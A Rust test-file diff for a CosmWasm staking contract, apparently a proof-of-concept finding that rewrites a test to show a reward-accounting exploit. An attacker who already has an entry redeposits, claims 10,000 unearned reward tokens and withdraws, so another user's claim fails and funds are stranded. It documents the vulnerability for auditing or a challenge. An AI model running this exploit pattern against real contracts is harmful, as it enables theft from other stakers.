@@ -315,7 +315,15 @@ pub mod tests {
         )
         .unwrap();
 
-        // user1 will not receive any rewards anymore
+        // exploit - simply redeposit since USER (our attacker in this scenario) already has an entry in the USERS Map, and will not have their user_index auto-set to the current global_index
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(10_000, DENOM)],
+        )
+        .unwrap();
+
         let user_info: UserRewardInfo = app
             .wrap()
             .query_wasm_smart(
@@ -325,8 +333,38 @@ pub mod tests {
                 },
             )
             .unwrap();
-        assert_eq!(user_info.pending_rewards, Uint128::zero());
-        assert_eq!(user_info.staked_amount, Uint128::zero());
+        // USER may claim new rewards
+        assert_eq!(user_info.pending_rewards, Uint128::new(10_000));
+        assert_eq!(user_info.staked_amount, Uint128::new(10_000));
+
+        // claim rewards 
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::ClaimRewards {},
+            &[],
+        )
+        .unwrap();
+
+        // USER (our attacker) withdraws
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::Withdraw {
+                amount: Uint128::new(10_000),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // confirm exploit
+        let balance = app
+        .wrap()
+        .query_balance(USER.to_string(), REWARD_DENOM)
+        .unwrap()
+        .amount;
+
+        assert_eq!(balance, Uint128::new(25_000));
 
         // user2 gets all reward
         let user_info: UserRewardInfo = app
@@ -338,7 +376,7 @@ pub mod tests {
                 },
             )
             .unwrap();
-        assert_eq!(user_info.pending_rewards, Uint128::new(15_000));
+        assert_eq!(user_info.pending_rewards, Uint128::new(15_000)); // query still show 15k, but contract's balance is insufficient at this point
 
         // user2 perform full withdrawal
         app.execute_contract(
@@ -358,7 +396,7 @@ pub mod tests {
             &ExecuteMsg::ClaimRewards {},
             &[],
         )
-        .unwrap();
+        .unwrap_err();  // attacker stole 10k REWARD_DENOM; breaks now
 
         // contract should have zero funds
         let balance = app
@@ -376,7 +414,7 @@ pub mod tests {
             .unwrap()
             .amount;
 
-        assert_eq!(balance, Uint128::zero());
+        assert_eq!(balance, Uint128::new(5_000)); // stuck reward denom
 
         // user2 receives reward denom
         let balance = app
@@ -385,7 +423,7 @@ pub mod tests {
             .unwrap()
             .amount;
 
-        assert_eq!(balance, user_info.pending_rewards);
+        assert_eq!(balance, Uint128::zero()); // got nothing
 
         // user2 receives funds
         let balance = app
@@ -408,6 +446,6 @@ pub mod tests {
             .unwrap();
 
         assert_eq!(user_info.staked_amount, Uint128::zero());
-        assert_eq!(user_info.pending_rewards, Uint128::zero());
+        assert_eq!(user_info.pending_rewards, Uint128::new(15_000)); // still thinks 15k pending for user2
     }
 }
